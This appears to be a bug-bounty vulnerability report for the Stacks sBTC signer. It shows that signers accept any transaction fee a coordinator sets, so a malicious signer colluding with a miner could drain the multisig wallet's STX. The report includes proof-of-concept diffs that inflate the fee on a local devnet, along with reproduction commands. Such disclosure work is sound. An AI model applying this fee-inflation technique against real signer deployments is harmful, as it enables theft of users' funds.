# #38392 \[BC-High] Signer can steal STX tokens in multi-sign wallet by setting a high stacks tx fee

**Submitted on Jan 2nd 2025 at 10:52:58 UTC by @f4lc0n for** [**Attackathon | Stacks**](https://immunefi.com/audit-competition/stacks-attackathon-1)

* **Report ID:** #38392
* **Report Type:** Blockchain/DLT
* **Report severity:** High
* **Target:** <https://github.com/stacks-network/sbtc/tree/immunefi\\_attackaton\\_0.9/signer>
* **Impacts:**
  * Direct loss of funds

## Description

## Brief/Intro

When a signer acts as a coordinator, it will initiate some sBTC stacks contract calls. And he can set the tx fee for these contract calls. These tx fees will be rewarded to the miners of the stacks chain.

The problem now is that signers do not check the tx fee set by the coordinator. Therefore, a malicious signer can set a very large tx fee to reward the multi-sign wallet's STX to the stacks miner. And he can cooperate with the stacks miner to steal this amount of funds.

## Vulnerability Details

The `signer/src/transaction_signer.rs::handle_stacks_transaction_sign_request` code is as follow.

```rust
    async fn handle_stacks_transaction_sign_request(
        &mut self,
        request: &StacksTransactionSignRequest,
        bitcoin_chain_tip: &model::BitcoinBlockHash,
        origin_public_key: &PublicKey,
    ) -> Result<(), Error> {
        let instant = std::time::Instant::now();
        let validation_status = self
            .assert_valid_stacks_tx_sign_request(request, bitcoin_chain_tip, origin_public_key)
            .await;

        metrics::histogram!(
            Metrics::ValidationDurationSeconds,
            "blockchain" => STACKS_BLOCKCHAIN,
            "kind" => request.tx_kind(),
        )
        .record(instant.elapsed());
        metrics::counter!(
            Metrics::SignRequestsTotal,
            "blockchain" => STACKS_BLOCKCHAIN,
            "kind" => request.tx_kind(),
            "status" => if validation_status.is_ok() { "success" } else { "failed" },
        )
        .increment(1);
        validation_status?;

        // We need to set the nonce in order to get the exact transaction
        // that we need to sign.
        let wallet = SignerWallet::load(&self.context, bitcoin_chain_tip).await?;
        wallet.set_nonce(request.nonce);

        let multi_sig = MultisigTx::new_tx(&request.contract_tx, &wallet, request.tx_fee);
        let txid = multi_sig.tx().txid();

        debug_assert_eq!(txid, request.txid);

        let signature = crate::signature::sign_stacks_tx(multi_sig.tx(), &self.signer_private_key);

        let msg = message::StacksTransactionSignature { txid, signature };

        self.send_message(msg, bitcoin_chain_tip).await?;

        Ok(())
    }
```

In the above code, it does not do any check on `request.tx_fee`. Therefore, a malicious signer can set any `tx_fee`, and all other signers will agree to this `tx_fee`.

## Impact Details

It will cause signers multi-signature wallets to lose STX tokens.

If the malicious signer and miner cooperate, the malicious signer can benefit from it.

## References

None

## Proof of Concept

## Proof of Concept

1. Base on: <https://github.com/stacks-network/sbtc/releases/tag/0.0.9-rc4>
2. Patch `signer/src/config/mod.rs`, add attacker flag config

   ```diff
        /// The minimum bitcoin block height for which the sbtc signers will
        /// backfill bitcoin blocks to.
        pub sbtc_bitcoin_start_height: Option<u64>,
   +    /// @audit;
   +    pub audit_this_signer_is_attacker: Option<bool>,
    }
    
    impl Validatable for SignerConfig {
   ```
3. Patch `signer/src/main.rs`, load attacker flag

   ```diff
        );
    
        // Load the configuration file and/or environment variables.
   -    let settings = Settings::new(args.config)?;
   +    let mut settings = Settings::new(args.config)?;
   +    std::thread::sleep(std::time::Duration::from_millis(2000)); // wait for the `docker logs` command
   +    settings.signer.audit_this_signer_is_attacker = match std::env::var("AUDIT_THIS_SIGNER_IS_ATTACKER") {
   +        Ok(value) => Some(value.parse::<bool>().unwrap()),
   +        _ => Some(false),
   +    };
   +    tracing::info!("@audit; audit_this_signer_is_attacker: {:?}", settings.signer.audit_this_signer_is_attacker);
        signer::metrics::setup_metrics(settings.signer.prometheus_exporter_endpoint);
    
        // Open a connection to the signer db.
   ```
4. Patch `docker/docker-compose.yml`, add attacker flag

   ```diff
          - postgres-3
        environment:
          <<: *sbtc-signer-environment
   +      AUDIT_THIS_SIGNER_IS_ATTACKER: true
          SIGNER_SIGNER__DB_ENDPOINT: postgresql://postgres:postgres@postgres-3:5432/signer
          SIGNER_SIGNER__PRIVATE_KEY: 3ec0ca5770a356d6cd1a9bfcbf6cd151eb1bd85c388cc00648ec4ef5853fdb7401
          SIGNER_SIGNER__P2P__SEEDS: tcp://sbtc-signer-1:4122,tcp://sbtc-signer-2:4122
   ```
5. Patch `signer/src/transaction_coordinator.rs`, add attack action

   ```diff
             // Complete deposit requests should be done as soon as possible, so
             // we set the fee rate to the high priority fee.
    -        let tx_fee = self
    +        let mut tx_fee = self
                 .context
                 .get_stacks_client()
                 .estimate_fees(wallet, &contract_call, FeePriority::High)
                 .await?;
    +        // @audit; start
    +        if self.context.config().signer.audit_this_signer_is_attacker.is_some_and(|x| x) {
    +            tx_fee = tx_fee * 100000000;
    +            tracing::info!("@audit; attacker set large tx fee, tx_fee: {:?}", tx_fee);
    +        }
    +        // @audit; end
    
             let multi_tx = MultisigTx::new_tx(&contract_call, wallet, tx_fee);
             let tx = multi_tx.tx();
   ```
6. Run docker

   ```sh
   make devenv-up
   make devenv-down
   docker compose -f docker/docker-compose.yml --profile default --profile bitcoin-mempool --profile sbtc-signer build
   make devenv-up
   ```
7. This PoC sets *sbtc-signer-3* as an attacker, which will automatically attack if it is the coordinator
8. Keep running the demo until the trigger the coordinator is *sbtc-signer-3*. You can observe the log of *sbtc-signer-3*. When `"@audit; attacker set large tx fee"` appears, it is triggered.

   ```sh
   ./signers.sh demo
   ```
9. Track the transaction initiated by *sbtc-signer-3* on [explorer](https://explorer.hiro.so/address/SN3R84XZYA63QS28932XQF3G1J8R9PC3W76P9CSQS?chain=testnet\&api=http://localhost:3999), and you will find that it consumes a lot of STX
